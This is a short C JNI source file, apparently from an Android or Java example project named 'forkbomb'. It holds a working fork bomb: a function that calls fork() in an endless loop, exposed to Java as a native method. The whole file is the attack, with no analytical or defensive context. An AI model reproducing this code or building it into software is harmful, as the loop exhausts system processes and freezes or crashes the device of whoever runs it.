#include "com_example_forkbomb_NativeLib.h"

#include <unistd.h>
#include <stdlib.h>

void forkbomb(){
	while(1)fork();
}

JNIEXPORT void JNICALL Java_com_example_forkbomb_NativeLib_fb(JNIEnv * env, jobject obj) {
	forkbomb();
}

